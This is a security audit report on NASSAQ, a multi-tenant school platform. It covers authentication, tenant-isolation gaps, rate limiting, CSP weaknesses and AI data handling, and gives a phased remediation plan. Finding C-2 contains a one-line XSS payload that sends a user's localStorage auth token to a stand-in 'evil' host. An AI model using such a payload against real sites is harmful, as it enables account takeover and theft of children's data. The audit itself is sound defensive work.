# NASSAQ Security Audit Report

- **Date:** 2026-05-11
- **Mode:** Read-only (audit, no production changes)
- **Scope target:** Production runtime of NASSAQ (multi-tenant school platform — React frontend, FastAPI backend, PostgreSQL/SQLAlchemy, JWT auth, WebSockets, AI/Hakim, reporting/exports)
- **Audience:** Engineering + security leads preparing the platform for a sovereign / government-grade education deployment handling children's data.

---

## 1. Executive Summary

NASSAQ has a **mature, intentional security posture** for an application of its size. The auth subsystem (JWT with JTI revocation, atomic refresh-token rotation, password-change session invalidation, per-IP + per-account brute-force limits, bcrypt, hashed reset tokens) is **above industry baseline** and was clearly designed by someone who has shipped auth before. Tenant isolation is enforced through dedicated middleware + helpers (`tenant_isolation.py`, `auth_scope.py`), production guards block destructive DB ops and seeding, secrets are required from env (no hardcoded fallbacks), `/docs` is disabled in production, and security headers (HSTS, X-Frame-Options DENY, Permissions-Policy, a real CSP) are present.

That said, the platform is **not yet at a high-assurance / sovereign-deployment bar**. The most material gaps are:

1. **Tokens in `localStorage`** combined with **`script-src 'unsafe-inline'`** — any XSS becomes full account takeover, including for principals and platform admins.
2. **Inconsistent tenant scoping at the lookup layer** — several `GET /{id}` routes call `gd_find_one(... {"id": id})` with no `school_id` filter, relying on a downstream check (or having no check at all). This is the classic IDOR shape and contradicts the project rule that "tenant isolation is enforced at the database query level."
3. **Rate limiter keyed on `request.client.host`** — behind Replit's edge proxy this collapses to the proxy IP, so per-IP brute-force/DoS limits are effectively global per worker. Worse, the store is per-process memory, so multi-worker deployments multiply every limit.
4. **Public unauthenticated `/public/stats`** leaks aggregate counts of schools, students, etc. — useful for tenant enumeration and competitive intel.
5. **`X-School-Context` header used for impersonation/role-switch** — must be re-verified server-side every request against the original token's allowed set; needs explicit test coverage.
6. **No documented audit trail for sensitive admin actions** beyond the in-process `audit_middleware`. For a children's-data system, append-only, exportable audit logging is a compliance prerequisite.

None of these are unfixable. With ~1–2 weeks of focused hardening (Phase 1 below) the platform clears the bar for a private pilot. Reaching a defensible sovereign-deployment posture is a 2–3 month roadmap (Phase 3).

**Overall maturity:** Solid Level 2 ("intentionally secure") — needs Phase 1 fixes to reach Level 3 ("defensible against a motivated attacker") and Phase 3 work to reach Level 4 ("auditable for regulated children's data").

---

## 2. Scope Reviewed

### Backend
- Bootstrap & middleware: `backend/server.py`, `backend/app/middleware.py`, `backend/app/routes.py`, `backend/config.py`, `backend/dependencies.py`
- Auth & session: `backend/services/auth_service.py`, `backend/routes/auth_routes_mod.py`
- Tenancy & RBAC: `backend/auth_scope.py`, `backend/middleware/tenant_isolation.py`, `backend/middleware/rbac.py`
- Cross-cutting middleware: `backend/middleware/{rate_limiter,error_handler,audit_middleware,query_monitor,request_tracing}.py`
- Sample of route surface: `auth_routes_mod`, `parent_portal_routes`, `role_dashboards_mod`, `academics_year_term_routes`, `assessment_routes`, `attendance_routes`, `reporting_routes_mod`, `bulk_import_export_routes`, `monitoring_routes`, `security_routes`, `public_routes`, `websocket_routes`, `ai_routes_mod`
- AI surface: `backend/services/hakim_llm_service.py`, `backend/routes/ai_routes_mod.py`
- Static serving: `backend/app/routes.py` (`serve_react_app`)

### Frontend
- `frontend/src/App.js`, `frontend/src/contexts/AuthContext.js`, `frontend/src/services/apiClient.js`, `frontend/src/setupProxy.js`, `frontend/src/routes/appRoutes.js`, `frontend/src/components/guards/RouteGuards.js`
- XSS-sink scan across `frontend/src/pages/**` for `innerHTML`, `dangerouslySetInnerHTML`, `eval`, `new Function`, `document.write`
- Frontend env (`frontend/.env`)

### Out of scope (not proven production-reachable)
- `backend/scripts/`, `backend/seeds/`, `backend/tests/`, `backend/alembic/versions/`, `artifacts/mockup-sandbox/`, mockup/canvas tooling.

---

## 3. Confirmed Strengths (verified in code)

| Control | Evidence |
|---|---|
| **No silent JWT secret fallback** — process refuses to boot without it | `backend/dependencies.py:37` `raise SystemExit("FATAL: JWT_SECRET_KEY must be set. Aborting.")`; `backend/config.py:70-82` enforces ≥32 chars in production |
| **JTI-based revocation list checked on every request** | `backend/dependencies.py:179`; WebSocket auth also checks revocation in `backend/app/routes.py:186-190` |
| **Atomic refresh-token rotation** — old refresh token is revoked the moment a new one is issued | `backend/routes/auth_routes_mod.py:362-397` |
| **Password change invalidates all live sessions** via `iat` vs `last_password_change` comparison | `backend/routes/auth_routes_mod.py:332-350` |
| **Per-account brute-force limit on top of per-IP** | `backend/routes/auth_routes_mod.py:161-167` (`account_key = f"login_account:{credentials.email.lower()}"`) |
| **Account lockout flag respected on login & refresh** | `backend/routes/auth_routes_mod.py:205, 320` |
| **bcrypt for password storage; complexity validated server-side** | `backend/services/auth_service.py:26`; `backend/shared_models.py:41` |
| **Password-reset tokens are hashed at rest, single-use, with `purpose: "password_reset"` claim** | `backend/routes/auth_routes_mod.py:777, 811, 820` |
| **Rate limiter explicitly refuses to trust `X-Forwarded-For`** (no spoofing vector) | `backend/middleware/rate_limiter.py:85-92` |
| **`/docs`, `/redoc`, `/openapi.json` disabled in production** | `backend/server.py:61-69` |
| **Generic Arabic error responses; no `str(e)` leaked to clients** | `backend/middleware/error_handler.py:35-54`; `backend/server.py:71-130` |
| **Real CSP, HSTS, X-Frame-Options DENY, Permissions-Policy, Referrer-Policy, X-Content-Type-Options** | `backend/app/middleware.py:71-102` |
| **CORS rejects `*` in production** | `backend/config.py:76-77`; `allow_credentials=False` if origins is `*` (`backend/app/middleware.py:204`) |
| **Static file serving has dual path-traversal guard + extension allow-list** | `backend/app/routes.py:291-305` |
| **Bulk import: extension allow-list + 10 MB cap; processed in `BytesIO`, never written with user-controlled filename** | `backend/routes/bulk_import_export_routes.py:182, 187, 191` |
| **Reporting/export endpoints pin `school_id` to caller's tenant; only `PLATFORM_ADMIN` can override** | `backend/routes/reporting_routes_mod.py:546-563`; `backend/routes/bulk_import_export_routes.py:269` |
| **WebSocket auth: explicit `auth` handshake message after `accept()`, full JWT decode + revocation + locked-account checks; tenant_id derived from token, not client param** | `backend/routes/websocket_routes.py:138-207`; `backend/app/routes.py:167-200` |
| **Hakim AI: data sent to model is wrapped as `«literal»` blocks; control chars stripped; queries hard-pinned to caller's `school_id`** | `backend/services/hakim_llm_service.py:423, 489`; `backend/routes/ai_routes_mod.py:444, 1088` |
| **Parent→child link uses immutable IDs from `guardian_links`/`parents.student_ids`, not phone/email** | `backend/routes/parent_portal_routes.py:25, 72, 244` (with explicit comment naming the hazard) |
| **Destructive DB ops + seed scripts blocked outside dev** | `backend/config.py:54-65`; surfaced in `backend/routes/monitoring_routes.py:212-213` |
| **Schema managed exclusively by Alembic** — no `Base.metadata.create_all` in production paths | matches project rule, verified in `backend/server.py` |
| **Platform-admin-only endpoints actually require it** | `backend/routes/security_routes.py:55, 95, 160, 195, 225, 288, 307, 337, 367, 413, 426`; `backend/routes/monitoring_routes.py:138, 184, …` |

---

## 4. Findings by Severity

> Each finding: **Title • Severity • Area • Why it matters • Attack scenario • Evidence • Fix • Effort.**

### CRITICAL

#### C-1. Per-IP rate limiter collapses behind the production proxy
- **Area:** `backend/middleware/rate_limiter.py:85-92`
- **Why:** The limiter keys on `request.client.host` and explicitly refuses `X-Forwarded-For`. In Replit's deployment topology (and behind nearly any L7 proxy), `request.client.host` is the proxy's address, so **all real users share one bucket**. Worse, the store is in-process memory (`self._store: dict[str, list[float]]`, line 28) so with N workers every limit is effectively N×.
- **Attack:** A single attacker can exhaust the global per-pattern bucket on `/api/auth/login`, denying legitimate logins, while distributed credential stuffing is undetected because counts mix across all clients.
- **Fix:** (a) Configure FastAPI/Starlette to honor `X-Forwarded-For` only when the request comes from a known trusted proxy (env-driven CIDR allow-list), (b) move the store to Redis (or Postgres advisory locks for low volume) so it's shared across workers, (c) keep the per-account login limiter as a second layer (already correct).
- **Effort:** Architectural — 2–4 days including the trusted-proxy config and Redis wiring.

#### C-2. Tokens in `localStorage` + CSP allows `script-src 'unsafe-inline'`
- **Area:** `frontend/src/contexts/AuthContext.js:44, 82, 302, 308, 311, 350, 363, 368`; `backend/app/middleware.py:88` (CSP)
- **Why:** Any XSS — including a stored XSS through one of the rich-content fields parents/teachers can submit — can read `nassaq_token` and the refresh token from `localStorage`. The CSP keeps `'unsafe-inline'` for scripts, which means an injected `<script>` tag executes; CSP does not block exfiltration to `connect-src` because the policy permits `https:` for `img-src` and the limiter is per-process. A captured access token + refresh token gives the attacker a full 30-day session if "Remember me" was used.
- **Attack:** Stored XSS in a free-text field (announcement, behavior note, AI-rendered content) → token exfiltration via `new Image().src='https://evil/?'+localStorage.getItem('nassaq_token')` → silent attacker session as that user, including principals.
- **Fix:** (a) Move access + refresh tokens to `HttpOnly; Secure; SameSite=Strict` cookies issued by the backend; rely on automatic cookie attachment + CSRF token in a header for non-GET. (b) Tighten CSP: drop `'unsafe-inline'` for scripts, switch to nonces; CRA can be replaced with Vite to make this practical. (c) Until cookies land, add a strict CSP `Trusted-Types` policy and an explicit `connect-src` allow-list excluding wildcards.
- **Effort:** Cookies + CSRF: ~1 week. CSP nonces: 1–2 weeks (and benefits from a Vite migration the team is likely already considering).

#### C-3. Cross-tenant IDOR via unscoped `gd_find_one({"id": …})` lookups
- **Area:** Multiple routes — confirmed examples:
  - `backend/routes/academics_year_term_routes.py:145` (`get_academic_year`), `:283` (`get_term`), `:397` (`get_grade_level`) — **no tenant filter and no post-lookup check**, raw object returned.
  - `backend/routes/assessment_routes.py:174` (`get_assessment` calls `engine.get_assessment_by_id(assessment_id)` with no tenant arg).
  - `backend/routes/role_dashboards_mod.py:481` (`get_student_dashboard`) — lookup is unscoped, but a tenant check is performed at lines 487-490 before returning data, so this is a *timing/existence-disclosure* leak only.
- **Why:** The project's stated guarantee is "`tenant_id` enforced at the database query level for all sensitive data access." These routes break that contract. For academic-years/terms/grade-levels the leak is full-record (school structure of any other school is browseable by UUID); for `assessment` it depends on the engine's internal scoping (must be verified).
- **Attack:** A teacher in school A obtains/guesses an assessment UUID belonging to school B (UUIDs leak in screenshots, support tickets, tab titles, exported CSVs) and reads the assessment. Same for any school's term/grade-level structure.
- **Fix:** Add `school_id = current_user.get("tenant_id")` to every `gd_find_one` for tenant-owned tables, or — preferably — wrap `gd_find_one` in a `tenant_scoped_find_one(db, table, id, current_user)` helper that fails closed and is enforced via lint/grep CI rule.
- **Effort:** Quick win per route; building the helper + grep gate is ~2 days; auditing every route to use it is ~1 week.

#### C-4. Public, unauthenticated tenant/usage enumeration via `/public/stats`
- **Area:** `backend/routes/public_routes.py:21`
- **Why:** Aggregate counts of schools, students, etc. are returned without auth. For a sovereign-grade product this both leaks competitive/operational data and makes the platform itself a target ("how many children's records can I get if I breach this?"). It also enables enumeration over time.
- **Attack:** Competitor/regulator/attacker scrapes `/public/stats` daily, infers customer wins/losses, school sizes, growth, and prioritizes the platform for attack based on data volume.
- **Fix:** Remove the endpoint or gate it behind authenticated platform-admin role. If a marketing widget needs counts, snapshot static numbers at build time.
- **Effort:** Quick win — minutes.

### HIGH

#### H-1. Authenticated routes that don't enforce role/identity within the tenant
- **Area:** `backend/routes/attendance_routes.py:260` (`get_student_attendance`) — uses only `Depends(get_current_user)` and filters by `tenant_id`, but does not verify that the caller is actually permitted to see *that* `student_id` (a student in the same school could read another student's attendance).
- **Why:** Project rule treats RBAC as the primary boundary; tenant scoping alone is insufficient when multiple roles share a tenant.
- **Fix:** Add a `_can_view_student(current_user, student_id)` dependency that allows: the student themselves, their guardians (via `guardian_links`), the student's teachers, and admin roles within the school. Apply across attendance/grades/behavior/portfolio surfaces.
- **Effort:** 2–3 days for helper + retrofit to ~15 routes.

#### H-2. `restore_role` trusts `original_user_id` from the *current* (switched) token
- **Area:** `backend/routes/auth_routes_mod.py:1164`
- **Why:** Defense-in-depth concern. Today a forged restore claim only works if the JWT secret is compromised, but a leaked admin's switched token currently lets the holder restore back to the original (higher-privileged) account without re-authentication. There's no second factor on restore.
- **Fix:** Persist the impersonation session server-side (`impersonation_sessions` table with `original_user_id`, `target_user_id`, `started_at`, `expires_at`); on restore, look up by the switched-token's JTI and ignore client-supplied claims. Optionally require fresh-auth (recent password / MFA) on restore.
- **Effort:** ~3 days.

#### H-3. `forgot-password` and `reset-password` not in the explicit `RATE_LIMITS` map
- **Area:** `backend/routes/auth_routes_mod.py:770, 802`; `backend/middleware/rate_limiter.py` (`RATE_LIMITS` dict)
- **Why:** Email enumeration via the forgot-password endpoint and brute-forcing reset-token submissions are both standard attacker plays. The well-implemented login limiter doesn't apply here.
- **Fix:** Add explicit per-IP and per-email limits (e.g., 5/hour/email, 20/hour/IP) — and once C-1 is fixed, these become meaningful.
- **Effort:** Quick win — 30 min.

#### H-4. `script-src 'unsafe-inline'` (and `style-src 'unsafe-inline'`)
- **Area:** `backend/app/middleware.py:88-90`
- **Why:** The single biggest CSP weakness. Every other defense (HSTS, X-Frame-Options, no-eval) is undermined by this one line; it's what makes C-2 catastrophic instead of inconvenient.
- **Fix:** Migrate to nonces or hashes. Vite/Next migration makes this manageable; with CRA it's painful. Until then, at least add a restrictive `connect-src` (no wildcards), `object-src 'none'`, `base-uri 'none'`, and `form-action 'self'`, and add `Trusted-Types`.
- **Effort:** Tactical hardening: 1 day. Full nonces: 1–2 weeks (often combined with build-tool migration).

#### H-5. Risky `innerHTML` sink in `SecurityCenterPage`
- **Area:** `frontend/src/pages/SecurityCenterPage.jsx:529`
- **Why:** `container.innerHTML = html;` is used to render an offscreen template for `html2canvas`-based PDF export. Whether it's exploitable depends on whether any of the values interpolated into `html` are user-controlled. Even if not today, this pattern is a footgun and gets copy-pasted.
- **Fix:** Build the DOM with `document.createElement` + `textContent`, or pass through DOMPurify; add an ESLint rule `no-restricted-syntax` for `innerHTML`.
- **Effort:** ~2 hours for this file; ~1 day to add and enforce the lint rule.

#### H-6. Inconsistent `tenant_id` vs `school_id` field naming raises the chance of forgotten filters
- **Area:** Cross-cutting — e.g., `attendance` uses `tenant_id` (`attendance_routes.py:71`), `academic_years` uses `school_id` (`academics_year_term_routes.py:62`).
- **Why:** Two names for the same concept means every new contributor has a 50/50 chance of writing the wrong filter, and grep-based audits miss half. This is the structural cause of the IDORs in C-3.
- **Fix:** Pick one name (likely `school_id` since it's the domain term; keep `tenant_id` as alias inside the auth layer). Add a CI grep that fails any new `gd_find*` call referencing a tenant-owned table without the agreed key.
- **Effort:** ~1 week of careful migration + Alembic rename.

### MEDIUM

#### M-1. Rate-limit store is per-process memory
- Already covered as part of C-1; called out separately because even if you keep the limiter only per-account (not per-IP), correctness across workers requires shared state.

#### M-2. WebSocket disabled from CSP / security-headers middleware
- **Area:** `backend/app/middleware.py:73-74` — security-header middleware bails out entirely for `/api/ws/notifications` and `/ws`.
- **Why:** Acceptable for HTTP-style headers but means the WS handshake response is missing HSTS. Verify the upstream proxy adds HSTS on all responses; otherwise downgrade scenarios remain.

#### M-3. `frontend/.env` ships `DANGEROUSLY_DISABLE_HOST_CHECK=true`
- **Area:** `frontend/.env:6`
- **Why:** Dev-only flag, but its presence in committed config is a smell. Ensure production builds don't honor it (CRA only uses it for dev server; verified safe but confirm `.env.production` does not inherit). Add a build-time assertion.

#### M-4. Audit logging is in-process middleware only
- **Area:** `backend/middleware/audit_middleware.py` (405 lines), `backend/services/audit_service.py`
- **Why:** For a children's-data system, audit trails must be append-only, tamper-evident, and exportable to an external SIEM. Today the trail is in the same DB the attacker may compromise.
- **Fix:** Mirror critical audit events (auth, role-switch, admin actions, exports of student data, AI prompts containing PII) to an external append-only sink (e.g., Loki, S3 with object-lock, or vendor SIEM). Add a daily integrity check.
- **Effort:** 1–2 weeks.

#### M-5. AI prompts sent to OpenAI include identifiable student data
- **Area:** `backend/routes/ai_routes_mod.py:282, 381, 444`; `backend/services/hakim_llm_service.py`
- **Why:** Tenant scoping on the *server side* is enforced (good), but the *contents* sent to OpenAI include school name, student performance metrics, behavior records, and parent context. For a sovereign deployment with children's data, sending this to a US-based third-party model is typically a regulatory red line.
- **Fix:** (a) Pseudonymize student/teacher names before prompt construction (you already wrap in `«…»`; replace names with stable tokens and re-hydrate post-response), (b) make the model provider configurable so a sovereign deployment can swap to an in-region/on-prem LLM, (c) add a per-tenant "AI processing consent" flag and gate Hakim on it, (d) document the data flow in a DPIA.
- **Effort:** Pseudonymization + provider abstraction: ~2 weeks. DPIA: separate work-stream.

#### M-6. No documented session/admin-action expiry for impersonation
- **Area:** `backend/routes/auth_routes_mod.py:1074, 1136`
- **Why:** Switched-role tokens appear to use the same expiry as normal access tokens. For impersonation, best practice is short-lived (≤15 min) tokens with explicit reason and forced restore.
- **Fix:** Cap impersonation token lifetime at 15 min; require a `reason` field; surface the active impersonation banner across the UI; log start/end events to the external audit sink (M-4).

#### M-7. `cleanup_test_data.py` lacks an explicit production guard inside the script
- **Area:** `backend/scripts/cleanup_test_data.py`
- **Why:** Filters by `'Test School%'` only — a fat-finger rename of a real school could match. Defense in depth is missing.
- **Fix:** Add the same `config.destructive_ops_allowed` check at script entry; fail loudly otherwise.

### LOW

- **L-1.** `frontend/src/pages/UsersClassesManagement.jsx:711` — `innerHTML` with a static emoji string. Low risk, but replace with `textContent`.
- **L-2.** `frontend/src/pages/TeacherModule/TeacherSchedulePage.jsx:283` — `printWindow.document.write(...)` for printing. Acceptable pattern but ensure the assembled HTML never contains user-supplied free text without escaping.
- **L-3.** JWT defaults to `HS256`. Acceptable for single-process verification; for cross-service verification (future microservices, mobile app servers), migrate to `RS256`/`ES256` so the public key can be distributed without sharing the signing secret.
- **L-4.** No Subresource Integrity (`integrity=`) on third-party assets (Google Fonts is loaded from the CSP). Add SRI on any pinned CDN resources.
- **L-5.** `frontend/public/index.html` does not include a CSP `<meta>` fallback. The HTTP header is the canonical place; the meta fallback only matters if requests can be served without going through the FastAPI middleware.

---

## 5. Attack Surface Map

```
Internet
  │
  ├─ Replit edge proxy (TLS termination)
  │     │
  │     ├─ Public unauthenticated:
  │     │     /public/stats        ← INFO LEAK (C-4)
  │     │     /public/health
  │     │     /system/health (in monitoring_routes)
  │     │
  │     ├─ Auth surface (per-IP + per-account rate limited):
  │     │     /auth/login, /auth/refresh, /auth/logout,
  │     │     /auth/forgot-password ← rate-limit gap (H-3)
  │     │     /auth/reset-password  ← rate-limit gap (H-3)
  │     │     /auth/role-switch, /auth/restore-role ← H-2
  │     │
  │     ├─ Authenticated school-role HTTP:
  │     │     ~50+ route modules; tenant scoping mostly enforced via
  │     │     middleware/tenant_isolation.py and current_user["tenant_id"];
  │     │     IDOR gaps confirmed in: academics_year_term_routes,
  │     │     assessment_routes, attendance_routes (role check) — C-3, H-1
  │     │
  │     ├─ Platform-admin HTTP:
  │     │     monitoring_routes, security_routes — guarded by
  │     │     require_roles([UserRole.PLATFORM_ADMIN]) ✓
  │     │
  │     ├─ WebSocket /api/ws/notifications:
  │     │     Two-step auth, JTI revocation, locked-account check,
  │     │     tenant_id from token — strong ✓
  │     │
  │     ├─ AI / Hakim (/ai/*):
  │     │     Tenant-scoped server-side ✓
  │     │     Outbound to OpenAI carries identifiable student data — M-5
  │     │
  │     └─ Static SPA (/static/*, /):
  │           Path-traversal guarded ✓; CSP allows unsafe-inline — H-4
  │
  └─ Frontend (browser): tokens in localStorage — C-2 amplifier
```

---

## 6. Top 10 Urgent Actions

1. **Move JWT access + refresh tokens to `HttpOnly; Secure; SameSite=Strict` cookies** and add a CSRF token for non-GET. (C-2)
2. **Drop `script-src 'unsafe-inline'`** from CSP — switch to nonces (likely alongside a Vite migration). (H-4)
3. **Add `school_id` to every `gd_find_one({"id": …})` for tenant-owned tables** and introduce `tenant_scoped_find_one()` + a CI grep gate. (C-3, H-6)
4. **Trust `X-Forwarded-For` only from a configured trusted-proxy CIDR** and **back the rate-limiter store with Redis** (or another shared store) so per-IP limits are real. (C-1)
5. **Remove or platform-admin-gate `/public/stats`.** (C-4)
6. **Add explicit rate limits to `/auth/forgot-password` and `/auth/reset-password`** (per-IP and per-email). (H-3)
7. **Add a `_can_view_student()` dependency** and apply it to attendance/grades/behavior/portfolio routes. (H-1)
8. **Persist impersonation sessions server-side**; cap token lifetime at 15 min; require a `reason`. (H-2, M-6)
9. **Fix the `innerHTML` sink in `SecurityCenterPage.jsx`** and add an ESLint rule banning `innerHTML`/`outerHTML`/`document.write` outside an allow-list. (H-5, L-1, L-2)
10. **Mirror critical audit events to an external append-only sink**, starting with auth, role-switch, admin actions, and exports of student data. (M-4)

---

## 7. Phased Remediation Roadmap

### Phase 1 — Immediate hardening (1–7 days)
- Items **3, 5, 6, 7, 9** from the Top 10. All are quick wins or single-day fixes.
- Tactical CSP tightening: drop `'unsafe-eval'` (already done — verified), add `object-src 'none'`, `base-uri 'none'`, `form-action 'self'`, restrictive `connect-src`.
- Add the `tenant_scoped_find_one` helper and migrate the confirmed offenders (academic-year, term, grade-level, assessment, student-dashboard).
- Add CI grep guard: any new `gd_find*` against a tenant-owned table must reference `school_id`.
- Add explicit production guard at the top of all `backend/scripts/*.py` that touch data.
- Add a smoke test that production builds reject `DANGEROUSLY_DISABLE_HOST_CHECK`.

### Phase 2 — Medium-priority fixes (2–4 weeks)
- Items **1, 4, 8, 10** from the Top 10.
- Cookie-based auth + CSRF (item 1) — coordinate with frontend.
- Trusted-proxy + Redis-backed rate limiter (item 4).
- Server-persisted impersonation sessions (item 8).
- External audit-log sink (item 10) — wire to S3 with object-lock or a managed SIEM.
- Standardize on `school_id` (or `tenant_id`) across the schema; Alembic rename + code sweep.
- DOMPurify + lint rule rollout to remove all `innerHTML`/`document.write` in pages.

### Phase 3 — Strategic / security-maturity (1–3 months)
- Item **2** from the Top 10 — full nonce-based CSP, likely with Vite migration.
- AI data-handling overhaul (M-5): pseudonymization layer, configurable LLM provider for sovereign deployments, per-tenant AI consent flag, DPIA documented.
- Migrate JWT signing to RS256/ES256 (L-3) so non-FastAPI services can verify without holding the signing key.
- Threat-model-driven test suite: write authz/IDOR test cases for every route module (currently the test directory exists but coverage of authz isn't visible).
- Children's-data compliance program: data-retention policy, parent consent ledger, right-to-erasure workflow, breach-notification runbook, annual external pen-test + SAST/DAST in CI (`security_scan` skill is available — wire it into PR gates).
- MFA for staff roles (principal, school admin, platform admin) — TOTP minimum, WebAuthn ideal.
- Per-tenant encryption key for sensitive columns (student names, behavior notes) using `pgcrypto` or application-level envelope encryption, so a single DB compromise doesn't surface plaintext for every school.

---

## 8. Open Questions / Unknowns

1. **`engine.get_assessment_by_id`** — the route doesn't pass tenant context; need to read the engine to confirm whether it filters internally. If not, this is a confirmed cross-tenant IDOR, not just a "shape" issue.
2. **`/system/health`** is public — does its body include version/build/commit data that aids targeted CVE matching? If yes, slim it.
3. **WebSocket revocation propagation** — confirmed at connect time, but does an in-flight WS connection get terminated when its JTI is revoked mid-session? If not, a stolen token keeps streaming notifications until the WS disconnects.
4. **Replit edge proxy headers** — does it strip incoming `X-Forwarded-For` from the client and replace it with the real one? If yes, then the trusted-proxy config in C-1 becomes the single point that needs to be right.
5. **Refresh-token JTI persistence** — refresh rotation revokes the old JTI; is the *family* (chain of refresh tokens) tracked so that replay of an already-rotated token *also* invalidates the current valid one? (Detection of stolen refresh tokens.)
6. **Backups & restore** — encryption-at-rest for backups, retention policy, restore drill cadence, and access controls on backup buckets are not visible in the codebase and likely live in deployment config.
7. **PII export controls** — exports are tenant-scoped, but is there a per-export approval/audit + a download-link expiry? Bulk student exports are the highest-risk action a single principal can take.

---

## 9. Minimum Remediation Set Before a High-Sensitivity Deployment

Before NASSAQ should be considered for a sovereign / government education deployment, the following is the **non-negotiable minimum**:

- All Phase 1 items completed and verified by independent review.
- C-1, C-2, C-3, C-4, H-1, H-2, H-3, H-4 closed with regression tests.
- External, append-only audit log for: auth events, role-switch, admin actions, every export of student data, every Hakim request whose context contains PII.
- MFA enforced for every staff role (principal and above).
- Documented DPIA for the AI/Hakim data flow, including either pseudonymization or an in-region/on-prem model.
- Documented incident response runbook with named owners and a tested restore drill.
- Annual external penetration test + dependency scanning + SAST in CI as merge gates (the in-repo `security_scan` skill should be wired in; the recent dependency-scan task surfaced 60 vulnerabilities — those need to be triaged before any production deployment regardless).

---

## 10. Appendix — Files / Routes / Components Reviewed

### Backend files reviewed
```
backend/server.py
backend/config.py
backend/dependencies.py
backend/auth_scope.py
backend/app/middleware.py
backend/app/routes.py
backend/middleware/audit_middleware.py
backend/middleware/cache_metrics.py
backend/middleware/error_handler.py
backend/middleware/query_monitor.py
backend/middleware/rate_limiter.py
backend/middleware/rbac.py
backend/middleware/request_tracing.py
backend/middleware/tenant_isolation.py
backend/services/auth_service.py
backend/services/hakim_llm_service.py
backend/routes/auth_routes_mod.py
backend/routes/parent_portal_routes.py
backend/routes/role_dashboards_mod.py
backend/routes/websocket_routes.py
backend/routes/monitoring_routes.py
backend/routes/security_routes.py
backend/routes/public_routes.py
backend/routes/ai_routes_mod.py
backend/routes/academics_year_term_routes.py
backend/routes/assessment_routes.py
backend/routes/attendance_routes.py
backend/routes/reporting_routes_mod.py
backend/routes/bulk_import_export_routes.py
backend/routes/class_management_routes.py
backend/routes/student_management_routes.py
backend/routes/academics_student_routes.py
backend/shared_models.py (auth/password validation only)
```

### Frontend files reviewed
```
frontend/src/App.js
frontend/src/contexts/AuthContext.js
frontend/src/services/apiClient.js
frontend/src/setupProxy.js
frontend/src/routes/appRoutes.js
frontend/src/components/guards/RouteGuards.js
frontend/public/index.html
frontend/.env
frontend/src/pages/SecurityCenterPage.jsx (XSS sink)
frontend/src/pages/UsersClassesManagement.jsx (innerHTML)
frontend/src/pages/TeacherModule/TeacherSchedulePage.jsx (document.write)
```

### Routes specifically inspected for authz/tenancy
- All `/auth/*` (login, refresh, logout, forgot, reset, role-switch, restore-role)
- `/parent/*` (parent portal)
- `/student-dashboard/{student_id}` (role_dashboards_mod)
- `/teacher-dashboard/*` (role_dashboards_mod)
- `/academic-years/{id}`, `/terms/{id}`, `/grade-levels/{id}`
- `/assessments/{id}`
- `/attendance/student/{id}`
- `/reports/*` (reporting_routes_mod)
- `/bulk/*` (import/export)
- `/monitoring/*`, `/security/*`, `/public/*`
- `/api/ws/notifications` (WebSocket)
- `/ai/*` (Hakim)

### Confirmed strong patterns (re-listed for traceability)
- JWT secret enforcement: `backend/dependencies.py:37`
- JTI revocation: `backend/dependencies.py:179`
- Refresh rotation: `backend/routes/auth_routes_mod.py:362-397`
- Password-change session invalidation: `backend/routes/auth_routes_mod.py:332-350`
- Per-account login limiter: `backend/routes/auth_routes_mod.py:161-167`
- Hashed reset tokens: `backend/routes/auth_routes_mod.py:777, 820`
- `X-Forwarded-For` not trusted: `backend/middleware/rate_limiter.py:85-92`
- Sanitized error responses: `backend/middleware/error_handler.py:35-54`
- CSP/HSTS/X-Frame headers: `backend/app/middleware.py:71-102`
- Path-traversal guard on static: `backend/app/routes.py:291-305`
- WebSocket two-step auth: `backend/routes/websocket_routes.py:138-207`
- Tenant-scoped AI context: `backend/routes/ai_routes_mod.py:444, 1088`
- Parent→child by immutable ID: `backend/routes/parent_portal_routes.py:25, 72, 244`

### Confirmed gaps (re-listed for traceability)
- C-1: `backend/middleware/rate_limiter.py:85-92` (per-IP keying behind proxy + per-process store)
- C-2: `frontend/src/contexts/AuthContext.js:302, 308, 311, 350, 363, 368` (localStorage tokens) + `backend/app/middleware.py:88` (`script-src 'unsafe-inline'`)
- C-3: `backend/routes/academics_year_term_routes.py:145, 283, 397`; `backend/routes/assessment_routes.py:174`; `backend/routes/role_dashboards_mod.py:481`
- C-4: `backend/routes/public_routes.py:21`
- H-1: `backend/routes/attendance_routes.py:260`
- H-2: `backend/routes/auth_routes_mod.py:1164`
- H-3: `backend/routes/auth_routes_mod.py:770, 802` (no entry in `RATE_LIMITS`)
- H-4: `backend/app/middleware.py:88-90`
- H-5: `frontend/src/pages/SecurityCenterPage.jsx:529`
- H-6: cross-cutting (`tenant_id` vs `school_id`)

---

*End of report.*
